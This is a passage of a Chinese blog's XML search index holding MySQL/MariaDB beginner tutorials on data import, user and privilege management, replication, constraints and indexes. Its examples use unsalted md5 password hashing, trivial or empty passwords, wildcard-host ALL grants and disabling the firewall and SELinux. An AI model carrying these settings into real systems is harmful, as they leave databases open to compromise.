MariaDB [test]&gt; load data local infile &#x27;/root/sql.txt&#x27; into table sj fields terminated by &#x27;,&#x27;(ID,Name,Day,@p) set Password=md5(@p);Query OK, 2 rows affected, 2 warnings (0.00 sec)Records: 2  Deleted: 0  Skipped: 0  Warnings: 2

结果
MariaDB [test]&gt; select * from sj;+----+--------+------------+------------------+| ID | Name   | Day        | Password         |+----+--------+------------+------------------+|  1 | w      | 1999-11-07 | f1290186a5d0b1ce ||  2 | 二哈   | 1996-12-01 | 49973c3a8ab362ad ||  3 | 张三   | 2000-01-02 | 01d7f40760960e7b ||  4 | 李四   | 2001-06-15 | e10adc3949ba59ab |+----+--------+------------+------------------+4 rows in set (0.00 sec)

命令解释load data local infile &#39;/root/sql.txt&#39;  &#x2F;&#x2F;加载本地sql.txt文件into table sj   &#x2F;&#x2F;导入sj这个表fields terminated by &#39;,&#39;  &#x2F;&#x2F;指明txt中分割数据的符号(ID,Name,Day,@p) set Password=md5(@p);  &#x2F;&#x2F;字段名，md5(@p)表示md5加密前面定义的@p字段的内容
]]></content>
      <categories>
        <category>mysql</category>
      </categories>
      <tags>
        <tag>基础知识</tag>
        <tag>mysql</tag>
      </tags>
  </entry>
  <entry>
    <title>mysql从入门到入土（二）</title>
    <url>/posts/74c2ef78/</url>
    <content><![CDATA[用户操作创建用户CREATE USER &#x27;username&#x27;@&#x27;host&#x27; IDENTIFIED BY &#x27;password&#x27;;

username - 你将创建的用户名,host - 指定该用户在哪个主机上可以登陆,如果是本地用户可用localhost, 如果想让该用户可以从任意远程主机登陆,可以使用通配符%.password - 该用户的登陆密码,密码可以为空,如果为空则该用户可以不需要密码登陆服务器.

例子：
create user &#x27;m23100&#x27;@&#x27;localhost&#x27; identified BY &#x27;123456&#x27;;create user &#x27;m23100&#x27;@&#x27;192.168.1.101&#x27; identified BY &#x27;123456&#x27;;create user &#x27;m23100&#x27;@&#x27;%&#x27; identified BY &#x27;123456&#x27;;create user &#x27;m23100&#x27;@&#x27;%&#x27; identified BY &#x27;&#x27;;create user &#x27;m23100&#x27;@&#x27;%&#x27;;

删除用户DROP USER &#x27;username&#x27;@&#x27;host&#x27;;

查看用户信息select user,host,password from mysql.user;
可以在系统表user中看到所用用户信息因为字段太多，所以只查看user，host，password字段
赋予用户权限GRANT PRIVILEGES ON DATABASENAME.TABLENAME TO &#x27;username&#x27;@&#x27;host&#x27;;

privileges - 用户的操作权限,如SELECT , INSERT , UPDATE 等.如果要授予所的权限则使用ALL.;databasename - 数据库名,tablename-表名,如果要授予该用户对所有数据库和表的相应操作权限则可用 * 表示, 如 .

例子：
GRANT SELECT, INSERT ON test.user TO &#x27;m23100&#x27;@&#x27;%&#x27;;GRANT ALL ON *.* TO &#x27;m23100&#x27;@&#x27;%&#x27;;flush privileges; 刷新权限

注意:用以上命令授权的用户不能给其它用户授权,如果想让该用户可以授权,用以下命令:GRANT privileges ON databasename.tablename TO ‘username‘@’host’ with grant option;
查看用户权限show grants for &#x27;user01&#x27;@&#x27;%&#x27;;

回收用户权限REVOKE DELETE ON *.*  FROM 用户名@’%’;             -- 回收部分权限REVOKE ALL PRIVILEGES ON *.* FROM 用户名@’%’;             -- 回收所有权限


密码操作数据库内修改用户密码root修改其他用户密码set password for &#x27;user01&#x27;@&#x27;%&#x27;=password(&#x27;Qwer1234&#x27;);

普通用户修改自己密码set password=password(&#x27;123456&#x27;);

数据库外修改密码mysqladmin -u root -p原密码 password 修改的密码
]]></content>
      <categories>
        <category>mysql</category>
      </categories>
      <tags>
        <tag>基础知识</tag>
        <tag>mysql</tag>
      </tags>
  </entry>
  <entry>
    <title>mysql从入门到入土（六）</title>
    <url>/posts/8461dbd1/</url>
    <content><![CDATA[主从备份环境主数据库：10.10.10.1   db1从数据库：10.10.10.2   db2
mariadb版本越高越好
关闭firewalld和selinux或者开启对应规则
更改密码和设置权限mysql_secure_installation
disallow root login remotely需要选n，其他y
编辑配置文件vim /etc/my.cnf.d/server.cnf
在mysqld下写入如下设置
db1中
[mysqld]log_bin = mysql-bin  //[必须]启用二进制日志server_id = 1        //[必须]服务器唯一ID，默认是1，一般取IP最后一段

db2中
[mysqld]log_bin = mysql-binserver_id = 2

在db1上授权grant replication slave on *.* to &#39;user&#39;@&#39;192.168.1.2&#39; identified by &quot;123456&quot;;

在db2上匹配用户信息并启用进程change master to master_host=&quot;192.168.1.1&quot;,master_user=&quot;user&quot;,master_password=&quot;123456&quot;;
start slave

查看状态show  slave  status\G;

注：slave_io_running及slave_sql_running进程必须正常运行，即YES状态，否则都是错误的状态。
]]></content>
      <categories>
        <category>mysql</category>
      </categories>
      <tags>
        <tag>基础知识</tag>
        <tag>mysql</tag>
      </tags>
  </entry>
  <entry>
    <title>mysql从入门到入土（四）</title>
    <url>/posts/8ef1554f/</url>
    <content><![CDATA[约束主键约束
主键（PRIMARY KEY）的完整称呼是“主键约束”，是 MySQL 中使用最为频繁的约束。一般情况下，为了便于 DBMS 更快的查找到表中的记录，都会在表中设置一个主键。

主键分为单字段主键和多字段联合主键
关键参数primary key
单字段主键
多字段主键
自增长
默认情况下，AUTO_INCREMENT 的初始值是 1，每新增一条记录，字段值自动加 1。一个表中只能有一个字段使用 AUTO_INCREMENT 约束，且该字段必须有唯一索引，以避免序号重复（即为主键或主键的一部分）。AUTO_INCREMENT 约束的字段必须具备 NOT NULL 属性。AUTO_INCREMENT 约束的字段只能是整数类型（TINYINT、SMALLINT、INT、BIGINT 等）。AUTO_INCREMENT 约束字段的最大值受该字段的数据类型约束，如果达到上限，AUTO_INCREMENT 就会失效。

关键参数auto_increment
主键自增长
指定开始的值例如从100开始自增
唯一约束
MySQL 唯一约束（Unique Key）是指所有记录中字段的值不能重复出现。例如，为 id 字段加上唯一性约束后，每条记录的 id 值都是唯一的，不能出现重复的情况。如果其中一条记录的 id 值为‘0001’，那么该表中就不能出现另一条记录的 id 值也为‘0001’。


唯一约束与主键约束相似的是它们都可以确保列的唯一性。不同的是，唯一约束在一个表中可有多个，并且设置唯一约束的列允许有空值，但是只能有一个空值。而主键约束在一个表中只能有一个，且不允许有空值。比如，在用户信息表中，为了避免表中用户名重名，可以把用户名设置为唯一约束。

关键参数unique

非空约束
MySQL 非空约束（NOT NULL）指字段的值不能为空。对于使用了非空约束的字段，如果用户在添加数据时没有指定值，数据库系统就会报错。可以通过 CREATE TABLE 或 ALTER TABLE 语句实现。在表中某个列的定义后加上关键字 NOT NULL 作为限定词，来约束该列的取值不能为空。


比如，在用户信息表中，如果不添加用户名，那么这条用户信息就是无效的，这时就可以为用户名字段设置非空约束。

关键参数not null
除了email，其他不允许有空值
默认值
默认值（Default）的完整称呼是“默认值约束（Default Constraint）”，用来指定某列的默认值。在表中插入一条新记录时，如果没有为某个字段赋值，系统就会自动为这个字段插入默认值。

关键参数default

外键约束
MySQL 外键约束（FOREIGN KEY）是表的一个特殊字段，经常与主键约束一起使用。对于两个具有关联关系的表而言，相关联字段中主键所在的表就是主表（父表），外键所在的表就是从表（子表）。

关键参数foreign key() references table()
表1：
MariaDB [test]&gt; desc table1;+-------+-------------+------+-----+---------+-------+| Field | Type        | Null | Key | Default | Extra |+-------+-------------+------+-----+---------+-------+| id    | int(11)     | NO   | PRI | NULL    |       || name  | varchar(15) | YES  |     | NULL    |       || age   | int(11)     | YES  |     | NULL    |       |+-------+-------------+------+-----+---------+-------+3 rows in set (0.00 sec)

表二：
MariaDB [test]&gt; create table table2(id int primary key,age int,name varchar(12),foreign key(age) references table1(id));Query OK, 0 rows affected (0.00 sec)MariaDB [test]&gt; desc table2;+-------+-------------+------+-----+---------+-------+| Field | Type        | Null | Key | Default | Extra |+-------+-------------+------+-----+---------+-------+| id    | int(11)     | NO   | PRI | NULL    |       || age   | int(11)     | YES  | MUL | NULL    |       || name  | varchar(12) | YES  |     | NULL    |       |+-------+-------------+------+-----+---------+-------+3 rows in set (0.00 sec)


注意：从表的外键关联的必须是主表的主键，且主键和外键的数据类型必须一致。例如，两者都是 INT 类型，或者都是 CHAR 类型。如果不满足这样的要求，在创建从表时，就会出现“ERROR 1005(HY000): Can’t create table”错误。

检查约束
MySQL 检查约束（CHECK）是用来检查数据表中字段值有效性的一种手段，可以通过 CREATE TABLE 或 ALTER TABLE 语句实现。设置检查约束时要根据实际情况进行设置，这样能够减少无效数据的输入。


默认值约束和非空约束也可看作是特殊的检查约束。

关键参数check
但是设置了检查约束后并不会生效

check不生效是为mysql的bug *

官网原文:CHECKThe CHECK clause is parsed but ignored by all storage engines. See Section 1.8.2.3, “Foreign Key Differences”.


解决方法：


1：如果要设置CHECK约束的字段范围小，并且比较容易列举全部的值，就可以考虑将该字段的类型设置为枚举类型 enum()或集合类型set()。


2:如果需要设置CHECK约束的字段范围大，且列举全部值比较困难，比如整数或者某一区间，那就只能使用触发器来代替约束实现数据的有效性了

]]></content>
      <categories>
        <category>mysql</category>
      </categories>
      <tags>
        <tag>基础知识</tag>
        <tag>mysql</tag>
      </tags>
  </entry>
  <entry>
    <title>mysql从入门到入土（五）</title>
    <url>/posts/e16f9008/</url>
    <content><![CDATA[索引
索引是一种特殊的数据库结构，由数据表中的一列或多列组合而成，可以用来快速查询数据表中有某一特定值的记录。


使用索引可以很大程度上提高数据库的查询速度，还有效的提高了数据库系统的性能。

创建索引方法一：create index &lt;索引名&gt; on &lt;表名&gt; (&lt;列名&gt; [&lt;长度&gt;] [ ASC | DESC])
1: 在一个已有的表上创建索引，但是这个语句不能创建主键2: 一个表可以创建多个索引，但每个索引在该表中的名称是唯一的3: 列名和长度是可选项4: asc指定索引按照升序来排列，desc指定索引按照降序来排列，默认为ASC

方法二：创建表的时候同时创建索引
方法三：alter table &lt;name&gt; add [UNIQUE | FULLTEXT] [INDEX] 索引名(列名)
与create index语句差不多unique|fulltext为可选参数，分别表示唯一索引、全文索引

删除索引方法一：drop index &lt;索引名&gt; on &lt;表名&gt;
方法二：alter table &lt;表名&gt; drop index &lt;索引名&gt;
查看索引show index from &lt;表名&gt; [ from &lt;数据库名&gt;]


常用运算符算术运算符
逻辑运算符
比较运算符
位运算符
]]></content>
      <categories>
        <category>mysql</category>
      </categories>
      <tags>
        <tag>基础知识</tag>
        <tag>mysql</tag>
      </tags>
  </entry>
</search>
